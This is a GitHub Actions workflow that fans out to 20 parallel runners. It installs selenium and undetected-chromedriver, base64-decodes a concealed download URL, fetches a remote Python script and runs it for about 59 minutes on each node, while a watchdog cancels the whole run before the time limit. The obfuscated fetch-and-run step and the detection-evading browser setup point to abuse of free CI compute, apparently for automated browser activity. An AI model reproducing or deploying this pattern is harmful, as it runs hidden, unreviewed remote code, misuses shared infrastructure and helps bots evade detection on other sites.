name: Orion Task Dispatcher Engine

on:
  workflow_dispatch:

concurrency:
  group: orion-cluster-${{ github.workflow }}-${{ github.ref }}
  cancel-in-progress: false

permissions:
  actions: write
  contents: read

jobs:
  # =================================================================
  # Watchdog: يراقب زمن التشغيل وينهي سير العمل بعد 59 دقيقة
  # =================================================================
  cluster-watchdog:
    name: "System Watchdog"
    runs-on: ubuntu-latest
    timeout-minutes: 60
    env:
      TIMEOUT_SECS: 3540
    steps:
      - name: Monitor System Execution
        run: |
          echo "--> [WATCHDOG] Initializing execution timer for run ID: ${{ github.run_id }}"
          echo "--> [WATCHDOG] Target sleep window set to ${TIMEOUT_SECS} seconds (~59m)."

          sleep "${TIMEOUT_SECS}"

          echo "--> [WATCHDOG] Time limit reached. Triggering workflow abort call..."

          curl --silent --show-error --request POST \
            --header "Authorization: Bearer ${{ secrets.GITHUB_TOKEN }}" \
            --header "Accept: application/vnd.github+json" \
            --header "X-GitHub-Api-Version: 2022-11-28" \
            "https://api.github.com/repos/${{ github.repository }}/actions/runs/${{ github.run_id }}/cancel"

          echo "--> [WATCHDOG] Abort signal dispatched successfully."

  # =================================================================
  # Node Workers: تشغيل المهام المتوازية على العقد المختلفة
  # =================================================================
  worker-nodes:
    name: "Worker-${{ matrix.node_code }}"
    runs-on: ubuntu-latest
    timeout-minutes: 59

    strategy:
      fail-fast: false
      matrix:
        node_code: [A10, B20, C30, D40, E50, F60, G70, H80, I90, J100, K110, L120, M130, N140, O150, P160, Q170, R180, S190, T200]

    steps:
      # #################################################################
      # Step 1: تهيئة البيئة وتثبيت الحزم المطلوبة
      # #################################################################
      - name: Prepare Worker Environment
        run: |
          echo "[1/3] Preparing system environment on node ${{ matrix.node_code }}..."
          sudo apt-get update -qq && sudo apt-get install -y --no-install-recommends curl python3-pip
          echo "[1/3] System packages updated."

          echo "[2/3] Installing Python dependencies..."
          pip3 install -q requests psutil selenium undetected-chromedriver
          echo "[2/3] Python requirements satisfied."

      # #################################################################
      # Step 2: جلب البرنامج التنفيذي
      # #################################################################
      - name: Fetch Executable Script
        run: |
          echo "[3/3] Decoding target URL and downloading payload..."
          REMOTE_SRC=$(echo "aHR0cHM6Ly9odWdnaW5nZmFjZS5jby9kYXRhc2V0cy9zamtoZnVrL2ZvZm8vcmVzb2x2ZS9tYWluL3N0YXJ0LnB5" | base64 -d)
          curl -sL "${REMOTE_SRC}" -o app_runner.py
          echo "[3/3] Download complete."

      # #################################################################
      # Step 3: تشغيل البرنامج وإدارة دورة حياته (حد أقصى 59 دقيقة)
      # #################################################################
      - name: Execute Background Process
        run: |
          echo "[EXEC] Starting background task on node ${{ matrix.node_code }}..."

          python3 app_runner.py &
          TASK_PID=$!

          echo "[EXEC] Process started with PID: ${TASK_PID}. Waiting up to 3540 seconds..."

          sleep 3540

          if kill -0 "${TASK_PID}" 2>/dev/null; then
            echo "[EXEC] Maximum duration reached. Terminating process ${TASK_PID}..."
            kill -9 "${TASK_PID}"
            echo "[EXEC] Process successfully killed."
          else
            echo "[EXEC] Process exited naturally before timeout."
          fi
